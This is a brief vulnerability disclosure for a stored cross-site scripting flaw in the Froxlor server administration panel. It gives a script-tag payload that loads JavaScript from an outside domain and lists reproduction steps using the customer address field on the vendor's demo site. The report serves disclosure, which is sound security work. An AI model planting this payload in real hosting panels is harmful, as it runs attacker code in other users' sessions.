# Description
FRoxlor is server administration software for your needs. Developed by experienced server administrators, this panel simplifies the effort of managing your hosting platform.
this pakage is vulnerable for xss

# Payload USED
```
<script src=https://domain></script>
```
# POC
* used https://demo.froxlor.org/ for testing
* login to admin account
* In customers section click on settings and update the address column with the payload and save the updates made.
* then just login to customer ac
* XSS triggered.
# PermaLinks
[gdive](https://drive.google.com/drive/folders/1D2wIlsZGDnhFdm2W51fDrDwogkHI7kBd?usp=sharing)
